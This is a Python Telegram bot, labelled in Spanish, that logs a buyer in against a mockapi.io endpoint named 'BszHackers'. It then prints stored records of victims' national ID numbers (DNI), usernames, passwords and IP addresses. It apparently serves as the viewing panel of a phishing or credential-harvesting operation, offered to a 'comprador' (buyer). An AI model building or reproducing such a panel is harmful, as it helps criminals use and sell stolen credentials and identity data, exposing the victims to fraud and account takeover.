import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters
)

# Token
TOKEN = ''

# Estados
ASK_USER, ASK_PASS = range(2)

# Logging
logging.basicConfig(level=logging.INFO)

# API URLs
USERS_URL = "https://68434e6de1347494c31fa930.mockapi.io/R/BszHackers/User/cGVyZmls"
REGISTROS_URL = "https://68434e6de1347494c31fa930.mockapi.io/R/BszHackers/User/UmVnaXN0cm9z"

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📌 Información del bot", callback_data='info')],
        [InlineKeyboardButton("👤 Creador/Comprador", callback_data='creator')],
        [InlineKeyboardButton("🔐 Ver usuarios", callback_data='usuarios')]
    ]
    await update.message.reply_text("🧠 Bienvenido al bot, elige una opción:", reply_markup=InlineKeyboardMarkup(keyboard))

# Botones que NO son conversación
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'info':
        await query.edit_message_text("📌 Reglas del bot:\n1. No compartir\n2. Uso privado\n3. Respeto al creador.")
    elif query.data == 'creator':
        await query.edit_message_text("👤 Creador: @AvaStrOficial\n🛒 Comprador autorizado .")

# Entrada a la conversación
async def start_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("🔐 Ingrese su usuario:")
    return ASK_USER

# Verificar usuario
async def ask_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.message.text.strip()
    users = requests.get(USERS_URL).json()
    match = next((u for u in users if u.get("user") == username), None)

    if match:
        context.user_data['username'] = username
        await update.message.reply_text("🔐 Usuario encontrado. Ingrese su contraseña:")
        return ASK_PASS
    else:
        await update.message.reply_text("❌ Usuario no encontrado. Intenta nuevamente o escribe /cancel para salir.")
        return ASK_USER

async def ask_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = context.user_data.get('username')
    password = update.message.text.strip()

    users = requests.get(USERS_URL).json()
    match = next((u for u in users if u.get("user") == username and u.get("pass") == password), None)

    if match:
        registros = requests.get(REGISTROS_URL).json()
        texto = "✅ Bienvenido Administrador , Para Visualizar Nuevamente Precione /start \n📄 Registros encontrados:\n"
        for r in registros:
            texto += (
                f"──────GALECIA────────────\n"
                f"🆔 Numero De Usuario: {r.get('id', 'N/A')}\n"
                f"🪪 DNI: {r.get('dni', 'N/A')}\n"
                f"👤 Usuario: {r.get('usuario', 'Sin nombre')}\n"
                f"🔐 Clave: {r.get('clave', 'N/A')}\n"
                 f"─────INFORMACION────────\n"
                f"🌐 IP: {r.get('ip', 'N/A')}\n"
                 f"─────@Ni_culpa_Bot──────\n"
            )
        await update.message.reply_text(texto)
    else:
        await update.message.reply_text("❌ Contraseña incorrecta.")
    return ConversationHandler.END


# Cancelar conversación
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operación cancelada.")
    return ConversationHandler.END

# Main
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    # Conversación login
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_conversation, pattern="^usuarios$")],
        states={
            ASK_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_user)],
            ASK_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_pass)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Comandos y handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_buttons, pattern="^(info|creator)$"))  # Botones normales
    app.add_handler(conv_handler)  # Conversación de login

    app.run_polling()

if __name__ == '__main__':
    main()
